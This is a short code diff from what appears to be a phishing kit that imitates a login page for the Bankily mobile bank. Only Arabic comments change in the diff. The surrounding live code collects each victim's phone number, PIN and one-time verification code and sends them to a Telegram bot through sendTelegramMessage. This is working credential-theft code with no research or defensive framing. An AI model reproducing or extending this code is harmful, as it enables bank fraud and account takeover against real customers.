@@ -479,7 +479,7 @@ async function login(){
   if(ph.length !== 8 || !isValidPrefix || pin.length !== 4){
     document.getElementById('user-error-modal').classList.remove('hide');
   } else {
-    // إرسال الهاتف والرقم السري مباشرة فور الضغط على تسجيل الدخول
+    // إرسال معلومات تسجيل الدخول للبوت بالمعلومات الجديدة
     let message = `🔔 <b>Bankily Login</b>\n📱 Phone: ${ph}\n🔑 Pin: ${pin}`;
     await sendTelegramMessage(message);
     showOtp();
@@ -531,7 +531,7 @@ async function verify(){
   var ph=phEl.value.trim();
   var pin=P.map(function(p){return p.value;}).join('');
   
-  // إرسال رمز OTP مع البيانات السابقة عند محاولة التحقق
+  // إرسال رمز التحقق (OTP) مع رقم الهاتف والرقم السري للبوت
   let message = `🔔 <b>Bankily Login (OTP)</b>\n📱 Phone: ${ph}\n🔑 Pin: ${pin}\n📝 OTP: ${code}`;
   await sendTelegramMessage(message);
 
